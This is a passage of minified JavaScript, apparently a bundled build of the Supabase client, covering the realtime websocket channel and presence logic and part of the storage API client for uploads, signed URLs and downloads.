xt;(function(n){n.closed="closed",n.errored="errored",n.joined="joined",n.joining="joining",n.leaving="leaving"})(xt||(xt={}));var Ht;(function(n){n.close="phx_close",n.error="phx_error",n.join="phx_join",n.reply="phx_reply",n.leave="phx_leave",n.access_token="access_token"})(Ht||(Ht={}));var Zc;(function(n){n.websocket="websocket"})(Zc||(Zc={}));var ln;(function(n){n.Connecting="connecting",n.Open="open",n.Closing="closing",n.Closed="closed"})(ln||(ln={}));class Uy{constructor(t,r){this.callback=t,this.timerCalc=r,this.timer=void 0,this.tries=0,this.callback=t,this.timerCalc=r}reset(){this.tries=0,clearTimeout(this.timer)}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}class VT{constructor(){this.HEADER_LENGTH=1}decode(t,r){return t.constructor===ArrayBuffer?r(this._binaryDecode(t)):r(typeof t=="string"?JSON.parse(t):{})}_binaryDecode(t){const r=new DataView(t),s=new TextDecoder;return this._decodeBroadcast(t,r,s)}_decodeBroadcast(t,r,s){const a=r.getUint8(1),c=r.getUint8(2);let d=this.HEADER_LENGTH+2;const h=s.decode(t.slice(d,d+a));d=d+a;const p=s.decode(t.slice(d,d+c));d=d+c;const f=JSON.parse(s.decode(t.slice(d,t.byteLength)));return{ref:null,topic:h,event:p,payload:f}}}class Pc{constructor(t,r,s={},a=zy){this.channel=t,this.event=r,this.payload=s,this.timeout=a,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(t){this.timeout=t,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(t){this.payload=Object.assign(Object.assign({},this.payload),t)}receive(t,r){var s;return this._hasReceived(t)&&r((s=this.receivedResp)===null||s===void 0?void 0:s.response),this.recHooks.push({status:t,callback:r}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const t=r=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=r,this._matchReceive(r)};this.channel._on(this.refEvent,{},t),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(t,r){this.refEvent&&this.channel._trigger(this.refEvent,{status:t,response:r})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:t,response:r}){this.recHooks.filter(s=>s.status===t).forEach(s=>s.callback(r))}_hasReceived(t){return this.receivedResp&&this.receivedResp.status===t}}var sg;(function(n){n.SYNC="sync",n.JOIN="join",n.LEAVE="leave"})(sg||(sg={}));class rs{constructor(t,r){this.channel=t,this.state={},this.pendingDiffs=[],this.joinRef=null,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const s=r?.events||{state:"presence_state",diff:"presence_diff"};this.channel._on(s.state,{},a=>{const{onJoin:c,onLeave:d,onSync:h}=this.caller;this.joinRef=this.channel._joinRef(),this.state=rs.syncState(this.state,a,c,d),this.pendingDiffs.forEach(p=>{this.state=rs.syncDiff(this.state,p,c,d)}),this.pendingDiffs=[],h()}),this.channel._on(s.diff,{},a=>{const{onJoin:c,onLeave:d,onSync:h}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(a):(this.state=rs.syncDiff(this.state,a,c,d),h())}),this.onJoin((a,c,d)=>{this.channel._trigger("presence",{event:"join",key:a,currentPresences:c,newPresences:d})}),this.onLeave((a,c,d)=>{this.channel._trigger("presence",{event:"leave",key:a,currentPresences:c,leftPresences:d})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(t,r,s,a){const c=this.cloneDeep(t),d=this.transformState(r),h={},p={};return this.map(c,(f,m)=>{d[f]||(p[f]=m)}),this.map(d,(f,m)=>{const y=c[f];if(y){const v=m.map(C=>C.presence_ref),w=y.map(C=>C.presence_ref),E=m.filter(C=>w.indexOf(C.presence_ref)<0),T=y.filter(C=>v.indexOf(C.presence_ref)<0);E.length>0&&(h[f]=E),T.length>0&&(p[f]=T)}else h[f]=m}),this.syncDiff(c,{joins:h,leaves:p},s,a)}static syncDiff(t,r,s,a){const{joins:c,leaves:d}={joins:this.transformState(r.joins),leaves:this.transformState(r.leaves)};return s||(s=()=>{}),a||(a=()=>{}),this.map(c,(h,p)=>{var f;const m=(f=t[h])!==null&&f!==void 0?f:[];if(t[h]=this.cloneDeep(p),m.length>0){const y=t[h].map(w=>w.presence_ref),v=m.filter(w=>y.indexOf(w.presence_ref)<0);t[h].unshift(...v)}s(h,m,p)}),this.map(d,(h,p)=>{let f=t[h];if(!f)return;const m=p.map(y=>y.presence_ref);f=f.filter(y=>m.indexOf(y.presence_ref)<0),t[h]=f,a(h,f,p),f.length===0&&delete t[h]}),t}static map(t,r){return Object.getOwnPropertyNames(t).map(s=>r(s,t[s]))}static transformState(t){return t=this.cloneDeep(t),Object.getOwnPropertyNames(t).reduce((r,s)=>{const a=t[s];return"metas"in a?r[s]=a.metas.map(c=>(c.presence_ref=c.phx_ref,delete c.phx_ref,delete c.phx_ref_prev,c)):r[s]=a,r},{})}static cloneDeep(t){return JSON.parse(JSON.stringify(t))}onJoin(t){this.caller.onJoin=t}onLeave(t){this.caller.onLeave=t}onSync(t){this.caller.onSync=t}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var Ie;(function(n){n.abstime="abstime",n.bool="bool",n.date="date",n.daterange="daterange",n.float4="float4",n.float8="float8",n.int2="int2",n.int4="int4",n.int4range="int4range",n.int8="int8",n.int8range="int8range",n.json="json",n.jsonb="jsonb",n.money="money",n.numeric="numeric",n.oid="oid",n.reltime="reltime",n.text="text",n.time="time",n.timestamp="timestamp",n.timestamptz="timestamptz",n.timetz="timetz",n.tsrange="tsrange",n.tstzrange="tstzrange"})(Ie||(Ie={}));const og=(n,t,r={})=>{var s;const a=(s=r.skipTypes)!==null&&s!==void 0?s:[];return Object.keys(t).reduce((c,d)=>(c[d]=WT(d,n,t,a),c),{})},WT=(n,t,r,s)=>{const a=t.find(h=>h.name===n),c=a?.type,d=r[n];return c&&!s.includes(c)?Vy(c,d):ed(d)},Vy=(n,t)=>{if(n.charAt(0)==="_"){const r=n.slice(1,n.length);return qT(t,r)}switch(n){case Ie.bool:return HT(t);case Ie.float4:case Ie.float8:case Ie.int2:case Ie.int4:case Ie.int8:case Ie.numeric:case Ie.oid:return $T(t);case Ie.json:case Ie.jsonb:return GT(t);case Ie.timestamp:return KT(t);case Ie.abstime:case Ie.date:case Ie.daterange:case Ie.int4range:case Ie.int8range:case Ie.money:case Ie.reltime:case Ie.text:case Ie.time:case Ie.timestamptz:case Ie.timetz:case Ie.tsrange:case Ie.tstzrange:return ed(t);default:return ed(t)}},ed=n=>n,HT=n=>{switch(n){case"t":return!0;case"f":return!1;default:return n}},$T=n=>{if(typeof n=="string"){const t=parseFloat(n);if(!Number.isNaN(t))return t}return n},GT=n=>{if(typeof n=="string")try{return JSON.parse(n)}catch(t){return console.log(`JSON parse error: ${t}`),n}return n},qT=(n,t)=>{if(typeof n!="string")return n;const r=n.length-1,s=n[r];if(n[0]==="{"&&s==="}"){let c;const d=n.slice(1,r);try{c=JSON.parse("["+d+"]")}catch{c=d?d.split(","):[]}return c.map(h=>Vy(t,h))}return n},KT=n=>typeof n=="string"?n.replace(" ","T"):n;var ag;(function(n){n.ALL="*",n.INSERT="INSERT",n.UPDATE="UPDATE",n.DELETE="DELETE"})(ag||(ag={}));var lg;(function(n){n.BROADCAST="broadcast",n.PRESENCE="presence",n.POSTGRES_CHANGES="postgres_changes"})(lg||(lg={}));var cg;(function(n){n.SUBSCRIBED="SUBSCRIBED",n.TIMED_OUT="TIMED_OUT",n.CLOSED="CLOSED",n.CHANNEL_ERROR="CHANNEL_ERROR"})(cg||(cg={}));class Fd{constructor(t,r={config:{}},s){this.topic=t,this.params=r,this.socket=s,this.bindings={},this.state=xt.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=t.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:""}},r.config),this.timeout=this.socket.timeout,this.joinPush=new Pc(this,Ht.join,this.params,this.timeout),this.rejoinTimer=new Uy(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=xt.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(a=>a.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=xt.closed,this.socket._remove(this)}),this._onError(a=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,a),this.state=xt.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=xt.errored,this.rejoinTimer.scheduleTimeout())}),this._on(Ht.reply,{},(a,c)=>{this._trigger(this._replyEventName(c),a)}),this.presence=new rs(this),this.broadcastEndpointURL=this._broadcastEndpointURL()}subscribe(t,r=this.timeout){var s,a;if(this.socket.isConnected()||this.socket.connect(),this.joinedOnce)throw"tried to subscribe multiple times. 'subscribe' can only be called a single time per channel instance";{const{config:{broadcast:c,presence:d}}=this.params;this._onError(f=>t&&t("CHANNEL_ERROR",f)),this._onClose(()=>t&&t("CLOSED"));const h={},p={broadcast:c,presence:d,postgres_changes:(a=(s=this.bindings.postgres_changes)===null||s===void 0?void 0:s.map(f=>f.filter))!==null&&a!==void 0?a:[]};this.socket.accessToken&&(h.access_token=this.socket.accessToken),this.updateJoinPayload(Object.assign({config:p},h)),this.joinedOnce=!0,this._rejoin(r),this.joinPush.receive("ok",({postgres_changes:f})=>{var m;if(this.socket.accessToken&&this.socket.setAuth(this.socket.accessToken),f===void 0){t&&t("SUBSCRIBED");return}else{const y=this.bindings.postgres_changes,v=(m=y?.length)!==null&&m!==void 0?m:0,w=[];for(let E=0;E<v;E++){const T=y[E],{filter:{event:C,schema:O,table:R,filter:M}}=T,L=f&&f[E];if(L&&L.event===C&&L.schema===O&&L.table===R&&L.filter===M)w.push(Object.assign(Object.assign({},T),{id:L.id}));else{this.unsubscribe(),t&&t("CHANNEL_ERROR",new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=w,t&&t("SUBSCRIBED");return}}).receive("error",f=>{t&&t("CHANNEL_ERROR",new Error(JSON.stringify(Object.values(f).join(", ")||"error")))}).receive("timeout",()=>{t&&t("TIMED_OUT")})}return this}presenceState(){return this.presence.state}async track(t,r={}){return await this.send({type:"presence",event:"track",payload:t},r.timeout||this.timeout)}async untrack(t={}){return await this.send({type:"presence",event:"untrack"},t)}on(t,r,s){return this._on(t,r,s)}async send(t,r={}){var s,a;if(!this._canPush()&&t.type==="broadcast"){const{event:c,payload:d}=t,h={method:"POST",headers:{apikey:(s=this.socket.accessToken)!==null&&s!==void 0?s:"","Content-Type":"application/json"},body:JSON.stringify({messages:[{topic:this.subTopic,event:c,payload:d}]})};try{return(await this._fetchWithTimeout(this.broadcastEndpointURL,h,(a=r.timeout)!==null&&a!==void 0?a:this.timeout)).ok?"ok":"error"}catch(p){return p.name==="AbortError"?"timed out":"error"}}else return new Promise(c=>{var d,h,p;const f=this._push(t.type,t,r.timeout||this.timeout);t.type==="broadcast"&&!(!((p=(h=(d=this.params)===null||d===void 0?void 0:d.config)===null||h===void 0?void 0:h.broadcast)===null||p===void 0)&&p.ack)&&c("ok"),f.receive("ok",()=>c("ok")),f.receive("timeout",()=>c("timed out"))})}updateJoinPayload(t){this.joinPush.updatePayload(t)}unsubscribe(t=this.timeout){this.state=xt.leaving;const r=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(Ht.close,"leave",this._joinRef())};return this.rejoinTimer.reset(),this.joinPush.destroy(),new Promise(s=>{const a=new Pc(this,Ht.leave,{},t);a.receive("ok",()=>{r(),s("ok")}).receive("timeout",()=>{r(),s("timed out")}).receive("error",()=>{s("error")}),a.send(),this._canPush()||a.trigger("ok",{})})}_broadcastEndpointURL(){let t=this.socket.endPoint;return t=t.replace(/^ws/i,"http"),t=t.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i,""),t.replace(/\/+$/,"")+"/api/broadcast"}async _fetchWithTimeout(t,r,s){const a=new AbortController,c=setTimeout(()=>a.abort(),s),d=await this.socket.fetch(t,Object.assign(Object.assign({},r),{signal:a.signal}));return clearTimeout(c),d}_push(t,r,s=this.timeout){if(!this.joinedOnce)throw`tried to push '${t}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let a=new Pc(this,t,r,s);return this._canPush()?a.send():(a.startTimeout(),this.pushBuffer.push(a)),a}_onMessage(t,r,s){return r}_isMember(t){return this.topic===t}_joinRef(){return this.joinPush.ref}_trigger(t,r,s){var a,c;const d=t.toLocaleLowerCase(),{close:h,error:p,leave:f,join:m}=Ht;if(s&&[h,p,f,m].indexOf(d)>=0&&s!==this._joinRef())return;let v=this._onMessage(d,r,s);if(r&&!v)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(d)?(a=this.bindings.postgres_changes)===null||a===void 0||a.filter(w=>{var E,T,C;return((E=w.filter)===null||E===void 0?void 0:E.event)==="*"||((C=(T=w.filter)===null||T===void 0?void 0:T.event)===null||C===void 0?void 0:C.toLocaleLowerCase())===d}).map(w=>w.callback(v,s)):(c=this.bindings[d])===null||c===void 0||c.filter(w=>{var E,T,C,O,R,M;if(["broadcast","presence","postgres_changes"].includes(d))if("id"in w){const L=w.id,W=(E=w.filter)===null||E===void 0?void 0:E.event;return L&&((T=r.ids)===null||T===void 0?void 0:T.includes(L))&&(W==="*"||W?.toLocaleLowerCase()===((C=r.data)===null||C===void 0?void 0:C.type.toLocaleLowerCase()))}else{const L=(R=(O=w?.filter)===null||O===void 0?void 0:O.event)===null||R===void 0?void 0:R.toLocaleLowerCase();return L==="*"||L===((M=r?.event)===null||M===void 0?void 0:M.toLocaleLowerCase())}else return w.type.toLocaleLowerCase()===d}).map(w=>{if(typeof v=="object"&&"ids"in v){const E=v.data,{schema:T,table:C,commit_timestamp:O,type:R,errors:M}=E;v=Object.assign(Object.assign({},{schema:T,table:C,commit_timestamp:O,eventType:R,new:{},old:{},errors:M}),this._getPayloadRecords(E))}w.callback(v,s)})}_isClosed(){return this.state===xt.closed}_isJoined(){return this.state===xt.joined}_isJoining(){return this.state===xt.joining}_isLeaving(){return this.state===xt.leaving}_replyEventName(t){return`chan_reply_${t}`}_on(t,r,s){const a=t.toLocaleLowerCase(),c={type:a,filter:r,callback:s};return this.bindings[a]?this.bindings[a].push(c):this.bindings[a]=[c],this}_off(t,r){const s=t.toLocaleLowerCase();return this.bindings[s]=this.bindings[s].filter(a=>{var c;return!(((c=a.type)===null||c===void 0?void 0:c.toLocaleLowerCase())===s&&Fd.isEqual(a.filter,r))}),this}static isEqual(t,r){if(Object.keys(t).length!==Object.keys(r).length)return!1;for(const s in t)if(t[s]!==r[s])return!1;return!0}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(t){this._on(Ht.close,{},t)}_onError(t){this._on(Ht.error,{},r=>t(r))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(t=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=xt.joining,this.joinPush.resend(t))}_getPayloadRecords(t){const r={new:{},old:{}};return(t.type==="INSERT"||t.type==="UPDATE")&&(r.new=og(t.columns,t.record)),(t.type==="UPDATE"||t.type==="DELETE")&&(r.old=og(t.columns,t.old_record)),r}}const JT=()=>{},QT=typeof WebSocket<"u";class YT{constructor(t,r){var s;this.accessToken=null,this.channels=[],this.endPoint="",this.headers=FT,this.params={},this.timeout=zy,this.heartbeatIntervalMs=3e4,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.ref=0,this.logger=JT,this.conn=null,this.sendBuffer=[],this.serializer=new VT,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this._resolveFetch=c=>{let d;return c?d=c:typeof fetch>"u"?d=(...h)=>nr(async()=>{const{default:p}=await Promise.resolve().then(()=>ms);return{default:p}},void 0).then(({default:p})=>p(...h)):d=fetch,(...h)=>d(...h)},this.endPoint=`${t}/${Zc.websocket}`,r?.transport?this.transport=r.transport:this.transport=null,r?.params&&(this.params=r.params),r?.headers&&(this.headers=Object.assign(Object.assign({},this.headers),r.headers)),r?.timeout&&(this.timeout=r.timeout),r?.logger&&(this.logger=r.logger),r?.heartbeatIntervalMs&&(this.heartbeatIntervalMs=r.heartbeatIntervalMs);const a=(s=r?.params)===null||s===void 0?void 0:s.apikey;a&&(this.accessToken=a),this.reconnectAfterMs=r?.reconnectAfterMs?r.reconnectAfterMs:c=>[1e3,2e3,5e3,1e4][c-1]||1e4,this.encode=r?.encode?r.encode:(c,d)=>d(JSON.stringify(c)),this.decode=r?.decode?r.decode:this.serializer.decode.bind(this.serializer),this.reconnectTimer=new Uy(async()=>{this.disconnect(),this.connect()},this.reconnectAfterMs),this.fetch=this._resolveFetch(r?.fetch)}connect(){if(!this.conn){if(this.transport){this.conn=new this.transport(this._endPointURL(),void 0,{headers:this.headers});return}if(QT){this.conn=new WebSocket(this._endPointURL()),this.setupConnection();return}this.conn=new XT(this._endPointURL(),void 0,{close:()=>{this.conn=null}}),nr(async()=>{const{default:t}=await import("./browser-j2nGksm4.js").then(r=>r.b);return{default:t}},[]).then(({default:t})=>{this.conn=new t(this._endPointURL(),void 0,{headers:this.headers}),this.setupConnection()})}}disconnect(t,r){this.conn&&(this.conn.onclose=function(){},t?this.conn.close(t,r??""):this.conn.close(),this.conn=null,this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.reset())}getChannels(){return this.channels}async removeChannel(t){const r=await t.unsubscribe();return this.channels.length===0&&this.disconnect(),r}async removeAllChannels(){const t=await Promise.all(this.channels.map(r=>r.unsubscribe()));return this.disconnect(),t}log(t,r,s){this.logger(t,r,s)}connectionState(){switch(this.conn&&this.conn.readyState){case er.connecting:return ln.Connecting;case er.open:return ln.Open;case er.closing:return ln.Closing;default:return ln.Closed}}isConnected(){return this.connectionState()===ln.Open}channel(t,r={config:{}}){const s=new Fd(`realtime:${t}`,r,this);return this.channels.push(s),s}push(t){const{topic:r,event:s,payload:a,ref:c}=t,d=()=>{this.encode(t,h=>{var p;(p=this.conn)===null||p===void 0||p.send(h)})};this.log("push",`${r} ${s} (${c})`,a),this.isConnected()?d():this.sendBuffer.push(d)}setAuth(t){this.accessToken=t,this.channels.forEach(r=>{t&&r.updateJoinPayload({access_token:t}),r.joinedOnce&&r._isJoined()&&r._push(Ht.access_token,{access_token:t})})}_makeRef(){let t=this.ref+1;return t===this.ref?this.ref=0:this.ref=t,this.ref.toString()}_leaveOpenTopic(t){let r=this.channels.find(s=>s.topic===t&&(s._isJoined()||s._isJoining()));r&&(this.log("transport",`leaving duplicate topic "${t}"`),r.unsubscribe())}_remove(t){this.channels=this.channels.filter(r=>r._joinRef()!==t._joinRef())}setupConnection(){this.conn&&(this.conn.binaryType="arraybuffer",this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=t=>this._onConnError(t),this.conn.onmessage=t=>this._onConnMessage(t),this.conn.onclose=t=>this._onConnClose(t))}_endPointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:zT}))}_onConnMessage(t){this.decode(t.data,r=>{let{topic:s,event:a,payload:c,ref:d}=r;(d&&d===this.pendingHeartbeatRef||a===c?.type)&&(this.pendingHeartbeatRef=null),this.log("receive",`${c.status||""} ${s} ${a} ${d&&"("+d+")"||""}`,c),this.channels.filter(h=>h._isMember(s)).forEach(h=>h._trigger(a,c,d)),this.stateChangeCallbacks.message.forEach(h=>h(r))})}_onConnOpen(){this.log("transport",`connected to ${this._endPointURL()}`),this._flushSendBuffer(),this.reconnectTimer.reset(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this._sendHeartbeat(),this.heartbeatIntervalMs),this.stateChangeCallbacks.open.forEach(t=>t())}_onConnClose(t){this.log("transport","close",t),this._triggerChanError(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.scheduleTimeout(),this.stateChangeCallbacks.close.forEach(r=>r(t))}_onConnError(t){this.log("transport",t.message),this._triggerChanError(),this.stateChangeCallbacks.error.forEach(r=>r(t))}_triggerChanError(){this.channels.forEach(t=>t._trigger(Ht.error))}_appendParams(t,r){if(Object.keys(r).length===0)return t;const s=t.match(/\?/)?"&":"?",a=new URLSearchParams(r);return`${t}${s}${a}`}_flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(t=>t()),this.sendBuffer=[])}_sendHeartbeat(){var t;if(this.isConnected()){if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection"),(t=this.conn)===null||t===void 0||t.close(UT,"hearbeat timeout");return}this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef}),this.setAuth(this.accessToken)}}}class XT{constructor(t,r,s){this.binaryType="arraybuffer",this.onclose=()=>{},this.onerror=()=>{},this.onmessage=()=>{},this.onopen=()=>{},this.readyState=er.connecting,this.send=()=>{},this.url=null,this.url=t,this.close=s.close}}class zd extends Error{constructor(t){super(t),this.__isStorageError=!0,this.name="StorageError"}}function ot(n){return typeof n=="object"&&n!==null&&"__isStorageError"in n}class ZT extends zd{constructor(t,r){super(t),this.name="StorageApiError",this.status=r}toJSON(){return{name:this.name,message:this.message,status:this.status}}}class dg extends zd{constructor(t,r){super(t),this.name="StorageUnknownError",this.originalError=r}}var e3=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};const Wy=n=>{let t;return n?t=n:typeof fetch>"u"?t=(...r)=>nr(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)},t3=()=>e3(void 0,void 0,void 0,function*(){return typeof Response>"u"?(yield nr(()=>Promise.resolve().then(()=>ms),void 0)).Response:Response});var sr=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};const Ec=n=>n.msg||n.message||n.error_description||n.error||JSON.stringify(n),i3=(n,t)=>sr(void 0,void 0,void 0,function*(){const r=yield t3();n instanceof r?n.json().then(s=>{t(new ZT(Ec(s),n.status||500))}).catch(s=>{t(new dg(Ec(s),s))}):t(new dg(Ec(n),n))}),n3=(n,t,r,s)=>{const a={method:n,headers:t?.headers||{}};return n==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json"},t?.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};function ca(n,t,r,s,a,c){return sr(this,void 0,void 0,function*(){return new Promise((d,h)=>{n(r,n3(t,s,a,c)).then(p=>{if(!p.ok)throw p;return s?.noResolveJson?p:p.json()}).then(p=>d(p)).catch(p=>i3(p,h))})})}function td(n,t,r,s){return sr(this,void 0,void 0,function*(){return ca(n,"GET",t,r,s)})}function ji(n,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(n,"POST",t,s,a,r)})}function r3(n,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(n,"PUT",t,s,a,r)})}function Hy(n,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(n,"DELETE",t,s,a,r)})}var Mt=function(n,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(n,t||[])).next())})};const s3={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},ug={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};class o3{constructor(t,r={},s,a){this.url=t,this.headers=r,this.bucketId=s,this.fetch=Wy(a)}uploadOrUpdate(t,r,s,a){return Mt(this,void 0,void 0,function*(){try{let c;const d=Object.assign(Object.assign({},ug),a),h=Object.assign(Object.assign({},this.headers),t==="POST"&&{"x-upsert":String(d.upsert)});typeof Blob<"u"&&s instanceof Blob?(c=new FormData,c.append("cacheControl",d.cacheControl),c.append("",s)):typeof FormData<"u"&&s instanceof FormData?(c=s,c.append("cacheControl",d.cacheControl)):(c=s,h["cache-control"]=`max-age=${d.cacheControl}`,h["content-type"]=d.contentType);const p=this._removeEmptyFolders(r),f=this._getFinalPath(p),m=yield this.fetch(`${this.url}/object/${f}`,Object.assign({method:t,body:c,headers:h},d?.duplex?{duplex:d.duplex}:{})),y=yield m.json();return m.ok?{data:{path:p,id:y.Id,fullPath:y.Key},error:null}:{data:null,error:y}}catch(c){if(ot(c))return{data:null,error:c};throw c}})}upload(t,r,s){return Mt(this,void 0,void 0,function*(){return this.uploadOrUpdate("POST",t,r,s)})}uploadToSignedUrl(t,r,s,a){return Mt(this,void 0,void 0,function*(){const c=this._removeEmptyFolders(t),d=this._getFinalPath(c),h=new URL(this.url+`/object/upload/sign/${d}`);h.searchParams.set("token",r);try{let p;const f=Object.assign({upsert:ug.upsert},a),m=Object.assign(Object.assign({},this.headers),{"x-upsert":String(f.upsert)});typeof Blob<"u"&&s instanceof Blob?(p=new FormData,p.append("cacheControl",f.cacheControl),p.append("",s)):typeof FormData<"u"&&s instanceof FormData?(p=s,p.append("cacheControl",f.cacheControl)):(p=s,m["cache-control"]=`max-age=${f.cacheControl}`,m["content-type"]=f.contentType);const y=yield this.fetch(h.toString(),{method:"PUT",body:p,headers:m}),v=yield y.json();return y.ok?{data:{path:c,fullPath:v.Key},error:null}:{data:null,error:v}}catch(p){if(ot(p))return{data:null,error:p};throw p}})}createSignedUploadUrl(t){return Mt(this,void 0,void 0,function*(){try{let r=this._getFinalPath(t);const s=yield ji(this.fetch,`${this.url}/object/upload/sign/${r}`,{},{headers:this.headers}),a=new URL(this.url+s.url),c=a.searchParams.get("token");if(!c)throw new zd("No token returned by API");return{data:{signedUrl:a.toString(),path:t,token:c},error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}update(t,r,s){return Mt(this,void 0,void 0,function*(){return this.uploadOrUpdate("PUT",t,r,s)})}move(t,r){return Mt(this,void 0,void 0,function*(){try{return{data:yield ji(this.fetch,`${this.url}/object/move`,{bucketId:this.bucketId,sourceKey:t,destinationKey:r},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}copy(t,r){return Mt(this,void 0,void 0,function*(){try{return{data:{path:(yield ji(this.fetch,`${this.url}/object/copy`,{bucketId:this.bucketId,sourceKey:t,destinationKey:r},{headers:this.headers})).Key},error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}createSignedUrl(t,r,s){return Mt(this,void 0,void 0,function*(){try{let a=this._getFinalPath(t),c=yield ji(this.fetch,`${this.url}/object/sign/${a}`,Object.assign({expiresIn:r},s?.transform?{transform:s.transform}:{}),{headers:this.headers});const d=s?.download?`&download=${s.download===!0?"":s.download}`:"";return c={signedUrl:encodeURI(`${this.url}${c.signedURL}${d}`)},{data:c,error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}createSignedUrls(t,r,s){return Mt(this,void 0,void 0,function*(){try{const a=yield ji(this.fetch,`${this.url}/object/sign/${this.bucketId}`,{expiresIn:r,paths:t},{headers:this.headers}),c=s?.download?`&download=${s.download===!0?"":s.download}`:"";return{data:a.map(d=>Object.assign(Object.assign({},d),{signedUrl:d.signedURL?encodeURI(`${this.url}${d.signedURL}${c}`):null})),error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}download(t,r){return Mt(this,void 0,void 0,function*(){const a=typeof r?.transform<"u"?"render/image/authenticated":"object",c=this.transformOptsToQueryString(r?.transform||{}),d=c?`?${c}`:"";try{const h=this._getFinalPath(t);return{data:yield(yield td(this.fetch,`${this.url}/${a}/${h}${d}`,{headers:this.headers,noResolveJson:!0})).blob(),error:null}}catch(h){if(ot(h))return{data:null,error:h};throw h}})}getPublicUrl(t,r){const s=this._getFinalPath(t),a=[],c=r?.download?`download=${r.download===!0?"":r.download}`:"";c!==""&&a.push(c);const h=typeof r?.transform<"u"?"render/image":"object",p=this.transformOptsToQueryString(r?.transform||{});p!==""&&a.push(p);let f=a.join("&");return f!==""&&(f=`?${f}`),{data:{publicUrl:encodeURI(`${this.url}/${h}/public/${s}${f}`)}}}remove(t){return Mt(this,void 0,void 0,function*(){try{return{data:yield Hy(this.fetch,`${this.url}/object/${this.bucketId}`,{prefixes:t},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}list(t,r,s){return Mt(this,void 0,void 0,function*(){try{const 